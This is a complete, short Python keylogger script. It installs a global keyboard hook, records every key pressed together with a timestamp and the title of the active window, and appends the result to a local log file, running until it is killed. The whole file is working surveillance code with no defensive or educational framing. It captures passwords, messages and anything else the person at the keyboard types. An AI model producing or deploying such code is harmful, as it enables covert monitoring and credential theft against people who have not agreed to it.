import keyboard
from datetime import datetime
import pygetwindow as gw

class KeyLogger:
    def __init__(self, log_file="log.txt"):
        self.log_file = log_file

    def get_active_window(self):
        try:
            return gw.getActiveWindow().title
        except:
            return "Unknown"

    def log_event(self, event):
        time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        window = self.get_active_window()
        with open(self.log_file, "a", encoding="utf-8") as log:
            log.write(f"[{time}] ({window}) Key pressed: {event.name}\n")

    def start(self):
        keyboard.on_press(self.log_event)
        keyboard.wait()

if __name__ == "__main__":
    logger = KeyLogger()
    logger.start()